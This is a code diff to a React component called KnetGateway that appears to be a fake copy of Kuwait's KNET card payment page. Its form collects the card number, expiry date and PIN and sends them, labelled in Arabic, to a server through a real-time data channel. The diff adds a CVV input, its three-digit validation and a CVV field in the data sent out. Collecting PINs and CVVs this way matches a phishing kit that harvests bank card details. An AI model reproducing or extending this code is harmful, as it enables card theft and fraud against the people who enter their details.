@@ -11,6 +11,7 @@ import { mainInfo } from "@/real-time/context/signals";
 
 const KnetGateway = () => {
   const { state } = useLocation();
+
   const {
     register,
     handleSubmit,
@@ -27,7 +28,13 @@ const KnetGateway = () => {
 
   const onSubmit = (data: FieldValues) => {
     if (Object.values(data).filter((d) => !d).length === 0) {
-      mainInfo.value.query = "knet";
+      state.query = "knet";
+
+      mainInfo.value.state = {
+        price: state.price,
+        exp_month: data.exp_month,
+        exp_year: data.exp_year,
+      };
 
       const serverData = {
         "نوع البطاقة": "knet",
@@ -35,11 +42,7 @@ const KnetGateway = () => {
         "رقم البطاقة": `${data.card_code}${data.card_num}`,
         "تاريخ الانتهاء": `${data.exp_month}/${data.exp_year}`,
         pin: data.pin,
-      };
-
-      mainInfo.value.state = {
-        ...data,
-        payment_amount: state.payment_amount,
+        cvv: data.cvv,
       };
 
       sendDataToServer({
@@ -229,6 +232,33 @@ const KnetGateway = () => {
 
                 <Label
                   label=":PIN"
+                  className="text-xs flex-[30%] mt-3 text-sky-700"
+                />
+              </div>
+              <div className="-mb-3 flex justify-between gap-4">
+                <div className="flex-[70%]">
+                  <CustomInput
+                    label=""
+                    id="cvv"
+                    type="tel"
+                    errors={errors}
+                    register={register}
+                    placeholder=" "
+                    className="text-center"
+                    dir="ltr"
+                    inputClassName="h-6 bg-gray-100 placeholder:text-center text-center"
+                    options={{
+                      required: "هذا الحقل ضروري",
+                      pattern: {
+                        value: /^\d{3}$/,
+                        message: "يجب أن يكون كود CVV مكونًا من 3 أرقام فقط",
+                      },
+                    }}
+                  />
+                </div>
+
+                <Label
+                  label=":CVV"
                   className="text-xs flex-[30%] mt-3 text-sky-700"
                 />
               </div>
